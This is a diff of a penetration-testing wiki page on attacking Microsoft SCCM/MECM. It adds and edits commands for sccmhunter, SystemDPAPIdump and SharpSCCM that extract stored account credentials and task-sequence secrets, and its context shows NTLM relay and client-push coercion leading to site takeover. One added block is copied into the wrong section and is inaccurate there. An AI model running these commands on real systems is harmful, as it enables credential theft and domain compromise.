@@ -29,15 +29,19 @@ NAAs are manually created domain accounts used to retrieve data from the SCCM Di
 
 NAA doesn't need to be privileged on the domain, but it can happen that administrators give too many privileges to these accounts.
 
-It is worth to  note that, even after deleting or changing the NAA in the SCCM configuration, the binary file still contains the encrypted credentials on the enrolled computers.
+It is worth to note that, even after deleting or changing the NAA in the SCCM configuration, the binary file still contains the encrypted credentials on the enrolled computers.
 
 {% tabs %}
 {% tab title="UNIX-based" %}
+### SystemDPAPIdump
+
 From UNIX-like systems, with administrative privileges over a device enrolled in the SCCM environment, [SystemDPAPIdump.py](https://github.com/fortra/impacket/pull/1137) (Python) can be used to decipher via DPAPI the WMI blob related to SCCM and retrieve the stored credentials. Additionally, the tool can also extract SYSTEM DPAPI credentials.
 
 ```bash
 SystemDPAPIdump.py -creds -sccm $DOMAIN/$USER:$PASSWORD@target.$DOMAIN
 ```
+
+### Manualy
 
 On the other hand, it is possible, from a controlled computer account, to manually request the SCCM policy and retrieve the NAAs inside.
 
@@ -77,9 +81,11 @@ Step 4: Decode obfuscated strings
 
 To decode username and password use `.\DeobfuscateSecretString.exe` contained in [SharpSCCM](https://github.com/Mayyhem/SharpSCCM) or [sccmwtf](https://github.com/xpn/sccmwtf/blob/main/policysecretunobfuscate.c)
 
-````powershell
+```powershell
 policysecretdecrypt.exe $HEX_STRING
-````
+```
+
+### SCCMHunter
 
 Alternatively, [sccmhunter](https://github.com/garrettfoster13/sccmhunter) (Python) automates all the attack with, or without, an already controlled computer accounts. For this purpose, the `http` module uses the result from the `find` command and enumerates the remote hosts for SCCM/MECM enrollment web services. If it finds one, it performs [Adam Chester](https://twitter.com/\_xpn\_)'s attack for the specified computer account. If no account is already under control, the `-auto` flag can be indicated to create a new computer account.
 
@@ -89,6 +95,18 @@ python3 sccmhunter.py http -u $USER -p $PASSWORD -d $DOMAIN -dc-ip $DC_IP -auto
 
 #To use an already controlled computer account
 python3 sccmhunter.py http -u $USER -p $PASSWORD -d $DOMAIN -cn $COMPUTER_NAME -cp $COMPUTER_PASSWORD -dc-ip $DC_IP
+```
+
+#### DPAPI
+
+[sccmhunter](https://github.com/garrettfoster13/sccmhunter) (Python) DPAPI's module can also be used, with valid credentials for a local administrator on the target system, to remotely extract NAA credentials located in the local WMI repository.
+
+```bash
+# Extracting from WMI repository root\ccm\policy\Machine\ActualConfig namespace:
+python3 sccmhunter.py dpapi -u $USER -p $PASSWORD -d $DOMAIN -dc-ip $DC_IP -target $TARGET_IP -wmi
+
+# Extracting from WMI repository OBJECTS.DATA file:
+python3 sccmhunter.py dpapi -u $USER -p $PASSWORD -d $DOMAIN -dc-ip $DC_IP -target $TARGET_IP -disk
 ```
 {% endtab %}
 
@@ -129,7 +147,15 @@ TaskSequence are steps that can be configured by an administrator to perform spe
 
 {% tabs %}
 {% tab title="UNIX-based" %}
-At the time of writing, no solution exists to perform this attack from a UNIX-like machine.
+From UNIX-like systems, with administrative privileges over a device enrolled in the SCCM environment, [sccmhunter](https://github.com/garrettfoster13/sccmhunter) (Python) can be used to extract the TaskSequence variables remotely.
+
+```powershell
+# Extracting from WMI repository root\ccm\policy\Machine\ActualConfig namespace:
+python3 sccmhunter.py dpapi -u $USER -p $PASSWORD -d $DOMAIN -dc-ip $DC_IP -target $TARGET_IP -wmi
+
+# Extracting from WMI repository OBJECTS.DATA file:
+python3 sccmhunter.py dpapi -u $USER -p $PASSWORD -d $DOMAIN -dc-ip $DC_IP -target $TARGET_IP -disk
+```
 {% endtab %}
 
 {% tab title="From Windows" %}
@@ -137,7 +163,6 @@ From a Windows machine enrolled in the SCCM environment, [SharpSCCM](https://git
 
 ```powershell
 # Locally from WMI 
-
 Get-WmiObject -Namespace ROOT\ccm\policy\Machine\ActualConfig -Class CCM_TaskSequence
 
 # Extracting from CIM store
@@ -161,7 +186,15 @@ Devices enrolled in an SCCM environment can be grouped by collection. These exis
 
 {% tabs %}
 {% tab title="UNIX-based" %}
-At the time of writing, no solution exists to perform this attack from a UNIX-like machine.
+From UNIX-like systems, with administrative privileges over a device enrolled in the SCCM environment, [sccmhunter](https://github.com/garrettfoster13/sccmhunter) (Python) can be used to extract the TaskSequence variables remotely.
+
+```powershell
+# Extracting from WMI repository root\ccm\policy\Machine\ActualConfig namespace:
+python3 sccmhunter.py dpapi -u $USER -p $PASSWORD -d $DOMAIN -dc-ip $DC_IP -target $TARGET_IP -wmi
+
+# Extracting from WMI repository OBJECTS.DATA file:
+python3 sccmhunter.py dpapi -u $USER -p $PASSWORD -d $DOMAIN -dc-ip $DC_IP -target $TARGET_IP -disk
+```
 {% endtab %}
 
 {% tab title="From Windows" %}
@@ -181,12 +214,12 @@ SharpSCCM.exe local secrets -m wmi
 {% endtab %}
 {% endtabs %}
 
-<figure><img src="../../../.gitbook/assets/SharpSCCM-get-secrets-command.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
 
 ### Authentication Coercion via Client Push Installation
 
 {% hint style="info" %}
-In some case, the "Client Push Accounts"  could even be part of the Domain Admins group, leading to a complete takeover of the domain.
+In some case, the "Client Push Accounts" could even be part of the Domain Admins group, leading to a complete takeover of the domain.
 {% endhint %}
 
 The client push installation can be triggered forcefully or - if you're lucky - your compromised machine might not have the SCCM client installed, which mean you could capture the client push installation as it occurs.
@@ -213,6 +246,7 @@ Note that you could either capture & crack received credentials or relay them to
 ## Relay using ntlmrelayx.py
 ntlmrelayx.py -smb2support -socks -ts -ip 10.250.2.100 -t 10.250.2.179
 ```
+
 ```powershell
 # On Windows
 ## Credential capture using Inveigh 
@@ -232,7 +266,6 @@ SharpSCCM.exe invoke client-push -t <AttackerServer>
 **Step 3: Cleanup**
 
 If you run the above SharpSCCM command with the `--as-admin` parameter (cause you have admin privileges over the MP), there's nothing to do. Otherwise get in contact with the administrator of the SCCM system you just messed up and provide the name or IP of the attacker server you provided in the `-t <AttackerServer>` parameter. This is the device name that will appear in SCCM.
-
 
 ### SCCM Site Takeover
 
@@ -263,7 +296,7 @@ Some requirements are needed to perform the attack:
 * fallback to NTLM authentication is enabled (default)
 * the hotfix [KB15599094](https://learn.microsoft.com/fr-fr/mem/configmgr/hotfix/2207/15599094) not installed (it prevents the client push installation account to perform an NTLM connection to a client)
 * PKI certificates are not required for client authentication (default)
-* either:
+*   either:
 
     * MSSQL is reachable on the site database server
 
@@ -279,7 +312,7 @@ The first four requirements above apply to the [client push installation coercio
 
 1. Retrieve the controlled user SID
 
-The first step consists in retrieving the hexadecimal format of the user's SID (Security IDentifier) to grant "Full Administrator SCCM role" to, on the site database server. The hex formatted SID is needed in a part below: [#4.-obtain-an-sql-console](sccm-mecm.md#4.-obtain-an-sql-console "mention").
+The first step consists in retrieving the hexadecimal format of the user's SID (Security IDentifier) to grant "Full Administrator SCCM role" to, on the site database server. The hex formatted SID is needed in a part below: [sccm-mecm.md](sccm-mecm.md#4.-obtain-an-sql-console "mention").
 
 {% tabs %}
 {% tab title="UNIX-like" %}
@@ -462,7 +495,7 @@ Some requirements are needed to perform the attack:
 
 * a passive site server is present on the network and its reachable
 * knowing the NetBIOS name, FQDN, or IP address of the passive and active site servers is required
-* SMB signing is not required on the active site server (default) 
+* SMB signing is not required on the active site server (default)
 {% endhint %}
 
 1. Setup an NTLM relay server
